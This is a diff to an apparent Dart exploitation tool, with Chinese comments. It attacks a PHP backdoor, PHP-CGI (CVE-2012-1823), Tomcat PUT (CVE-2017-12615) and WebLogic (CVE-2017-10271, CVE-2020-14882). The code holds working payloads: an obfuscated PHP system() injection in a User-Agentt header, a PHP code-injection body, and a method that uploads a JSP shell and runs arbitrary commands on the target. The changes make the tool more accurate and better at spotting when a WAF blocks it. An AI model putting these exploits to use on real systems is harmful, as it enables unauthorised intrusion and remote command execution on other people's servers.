@@ -1,6 +1,7 @@
 import 'dart:convert';
 import 'dart:io';
 
+import '../../core/exploit_error.dart';
 import '../../../core/http/http_client.dart';
 import '../../../core/http/http_result.dart';
 
@@ -34,7 +35,8 @@ class PhpBackdoorExpService {
       final res = await _httpClient.getOrThrow(
         '$_base$phpPath',
         headers: {
-          'User-Agentt': r"zerodium$f='sys'.'tem';$f('echo PHP_BACKDOOR_54289');",
+          'User-Agentt':
+              r"zerodium$f='sys'.'tem';$f('echo PHP_BACKDOOR_'.(233*233));",
         },
       );
       if (looksLikeWafBlock(res.statusCode, res.body)) {
@@ -119,8 +121,15 @@ class PhpCgiExpService {
       final res = await _httpClient.postOrThrow(
         url,
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: '<?php echo "PHP_CGI_54289"; ?>',
+        // marker 由目标计算：回显 POST body 的中间件不会命中。
+        body: '<?php echo "PHP_CGI_".(233*233); ?>',
       );
+      final blocked = wafBlockedResult(
+        'CVE-2012-1823 (PHP-CGI)',
+        res.statusCode,
+        res.body,
+      );
+      if (blocked != null) return blocked;
       if ((res.body ?? '').contains('PHP_CGI_54289')) {
         return ExpResult(
           true,
@@ -229,12 +238,21 @@ class TomcatExpService {
         final getRes =
             await _httpClient.getOrThrow('$_base/tomcat_put_test.txt');
         if ((getRes.body ?? '').contains('tomcat_put_54289')) {
-          return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
+          // .txt 能写回不代表 .jsp 能执行——CVE-2017-12615 的核心是"写 JSP 并执行"，
+          // 上面那条分支已经证明不了时才走到这里，只能算"PUT 可用"。
+          return ExpResult(
+            false,
+            'CVE-2017-12615',
+            'PUT 可写文件但未能写 JSP 并执行，不构成 CVE-2017-12615',
+          );
         }
+        // 实测踩过的坑：只要服务器对 PUT 回 201/204 就判定"有漏洞"，
+        // 任何支持 PUT 的静态服务器（甚至一个 204 空响应）都会被算成 CVE。
+        // PUT 开启 ≠ 能写 JSP 并执行，读不回来就只是"PUT 可用"。
         return ExpResult(
-          true,
+          false,
           'CVE-2017-12615',
-          'PUT 方法开启 (状态 ${putRes.statusCode})',
+          'PUT 可用 (${putRes.statusCode}) 但写入的文件读不回来，不构成 CVE-2017-12615',
         );
       }
     } catch (e) {
@@ -259,18 +277,39 @@ class TomcatExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      await _httpClient.put(
+      final put = await _httpClient.put(
         '$_base/$_shellName.jsp/',
         headers: {'Content-Type': 'application/octet-stream'},
         body: _shellContent,
       );
+      // 实测踩过的坑：WAF 会拦掉带 getRuntime 的 shell JSP，PUT 实际没生效，
+      // 后续 GET 拿到的是 404 错误页 —— 旧实现把它当"命令输出"直接返回。
+      if (looksLikeWafBlock(put.statusCode, put.body)) {
+        throw ExploitBlocked(
+          'shell JSP 写入被拒（exec 载荷含关键词）',
+          statusCode: put.statusCode,
+        );
+      }
       await Future<void>.delayed(const Duration(milliseconds: 300));
       final res = await _httpClient.getOrThrow(
         '$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}',
       );
-      final respBody = res.body ?? '';
+      final status = res.statusCode ?? 0;
+      final respBody = (res.body ?? '').trim();
+      if (status == 404 || status == 403) {
+        throw ExploitNotWorking(
+          'shell 未落盘（GET $_shellName.jsp 返回 HTTP $status）——检测阶段可能被 WAF 放行、执行阶段被拦',
+        );
+      }
+      if (looksLikeBlockedBody(respBody)) {
+        throw ExploitBlocked('命令返回疑似拦截页', statusCode: status);
+      }
       return respBody.isNotEmpty ? respBody : null;
-    } catch (_) {
+    } on ExploitBlocked {
+      rethrow;
+    } on ExploitNotWorking {
+      rethrow;
+    } catch (e) {
       return null;
     }
   }
@@ -326,13 +365,16 @@ class WebLogicExpService {
   bool _looksLikeXmlDecoderEndpointResponse(HttpResult res) {
     final code = res.statusCode ?? 0;
     final body = (res.body ?? '').toLowerCase();
-    final isPotentialCode = code == 200 || code == 202 || code == 500;
-    final hasSoapOrFaultSignal = body.contains('soap') ||
-        body.contains('fault') ||
-        body.contains('weblogic.wsee') ||
+    // 实测踩过的坑：裸状态码判定会把"任何路径都回 200 的 SPA"判成 WebLogic RCE。
+    // 因此状态码只是必要条件之一，**必须**同时出现 WLS/XmlDecoder 的特征串。
+    final isEndpointCode = code == 200 || code == 202 || code == 500;
+    final hasWeblogicSignal = body.contains('weblogic') ||
+        body.contains('wls-wsat') ||
+        body.contains('xmldecoder') ||
         body.contains('workcontext') ||
-        body.contains('xmldecoder');
-    return isPotentialCode || hasSoapOrFaultSignal;
+        body.contains('weblogic.wsee') ||
+        (body.contains('soap') && body.contains('fault'));
+    return isEndpointCode && hasWeblogicSignal;
   }
 
   String? _pickXmlTag(String xml, String tag) {
@@ -398,6 +440,19 @@ class WebLogicExpService {
           body: _xmlDecoderPayload('id'),
         );
         anyResponse = true;
+        final blocked =
+            wafBlockedResult('CVE-2017-10271', res.statusCode, res.body);
+        if (blocked != null) return blocked;
+        // 回显守卫：把我们的 XML 原样吐回来的服务不能算命中。
+        // 只认"我们 payload 特有"的片段：真正的 WLS 故障页也用 soapenv:Envelope，
+        // 拿它当判据会把真阳性一起干掉。
+        final echoed = (res.body ?? '').contains('java.lang.ProcessBuilder');
+        if (echoed) {
+          return ExpResult.probeFailed(
+            'CVE-2017-10271',
+            '响应疑似回显了我们的请求，无法判定',
+          );
+        }
         if (_looksLikeXmlDecoderEndpointResponse(res)) {
           final code = res.statusCode ?? 0;
           return ExpResult(
@@ -450,6 +505,23 @@ class WebLogicExpService {
         final req = await client.getUrl(uri).timeout(timeout);
         req.followRedirects = false;
         final res = await req.close().timeout(timeout);
+        final consoleBlocked =
+            wafBlockedResult('CVE-2020-14882', res.statusCode, null);
+        if (consoleBlocked != null) return consoleBlocked;
+        // 回显守卫：请求路径里就带 %252e%252e%252fconsole.portal，
+        // 若响应把这个路径原样吐回来，不能算命中。
+        final echoBytes = await res.fold<List<int>>(
+          <int>[],
+          (a, b) => a..addAll(b),
+        );
+        final echoBody = String.fromCharCodes(echoBytes).toLowerCase();
+        if (echoBody.contains('%252e%252e') ||
+            echoBody.contains('console/css/')) {
+          return const ExpResult.probeFailed(
+            'CVE-2020-14882',
+            '响应疑似回显了我们的请求路径，无法判定',
+          );
+        }
         final location = (res.headers.value('location') ?? '').toLowerCase();
         final bytes = await res.fold<List<int>>(
           <int>[],
